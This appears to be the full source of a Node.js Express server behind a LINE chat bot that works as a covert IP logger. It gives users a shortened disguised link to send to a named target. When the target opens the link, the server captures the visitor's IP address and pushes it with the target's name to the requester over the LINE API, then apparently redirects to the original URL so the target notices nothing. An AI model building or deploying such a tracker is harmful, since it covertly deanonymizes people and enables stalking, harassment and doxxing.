const https = require("https")
const express = require("express");
const port = process.env.PORT || 3000;
const TOKEN = process.env.LINE_TOKEN;
let name, url, IP, userId;

setInterval(() => {
  name = null;
  IP = null;
  userId = null;
  url = null;
}, 600000);

const allowCrossDomain = function(req, res, next) {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE');
  res.header(
    'Access-Control-Allow-Headers',
    'Content-Type, Authorization, access_token'
  );
  if('OPTIONS' === req.method){
    res.sendStatus(200)
  }else{
    next()
  }
};


const app = express();

app
  .use(allowCrossDomain)
  .use(express.urlencoded({
    extended: true
  }))
  .use(express.json())
  .post("/webhook", (req, res) => {
    res.send("HTTP POST request sent to the webhook URL!");
    userId = req.body.events[0].source.userId;
    if (req.body.events[0].type === 'message') {
      const dataString = JSON.stringify({
        replyToken: req.body.events[0].replyToken,
        messages: [{"type": "text", "text": "https://rhipsali.github.io/get_ip\nこちらのサイトで特定したい相手の名前と元のURLを入力してください。"}]
      });
        
    const headers = {
      "Content-Type": "application/json",
      "Authorization": "Bearer " + TOKEN
    };

    const webhookOptions = {
      "hostname": "api.line.me",
      "path": "/v2/bot/message/reply",
      "method": "POST",
      "headers": headers,
      "body": dataString
    };

    const request = https.request(webhookOptions, (res) => {
        res.on("data", (d) => {
          process.stdout.write(d);
        })
      })

      request.on("error", (err) => {
        console.error(err);
      })
    
      request.write(dataString);
      request.end();
    }
  })
  .post("/", (req, res) => {
    name = req.body.name;
    url = req.body.url;
    res.send(JSON.stringify({access_url: "https://bit.ly/37AiGmD"}));
  })
  .get("/", (req, res) => {
    res.sendFile(__dirname + '/open.html');
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.connection.socket.remoteAddress || req.socket.remoteAddress || '0.0.0.0', 
    str = (ip.match(/[^0-9.]/g)) ? ip.replace(/[^0-9.]/g, "") : ip;
    IP = str;
    console.log(`名前: ${name = name || 'null'}\nIPアドレス: ${str}`);
    if(userId !== null && userId !== undefined && userId !== '') {
      setTimeout( () => pushMsg(`名前: ${name = name || 'null'}\nIPアドレス: ${str}`), 300);
    };
  })
  .get("/auth", (req, res) => {
    const URL = url || "https://rhipsali.github.io/get_ip";
    res.send(JSON.stringify({url: URL}));
  })
  .listen(port, () => console.log("listening on " + port))
;

function pushMsg(m) {
  const msg = JSON.stringify({
    to: userId,
    messages: [
      {"type": "text", "text": m}
    ]
  });

  const headers = {
    "Content-Type": "application/json",
    "Authorization": "Bearer " + TOKEN
  };
  const webhookOptions = {
    "hostname": "api.line.me",
    "path": "/v2/bot/message/push",
    "method": "POST",
    "headers": headers,
    "body": msg
  };
  const REQUEST = https.request(webhookOptions, (res) => {
    res.on("data", (d) => {
      process.stdout.write(d);
    });
  });
  REQUEST.on("error", (err) => {
    console.error(err);
  });
  REQUEST.write(msg);
  REQUEST.end();
};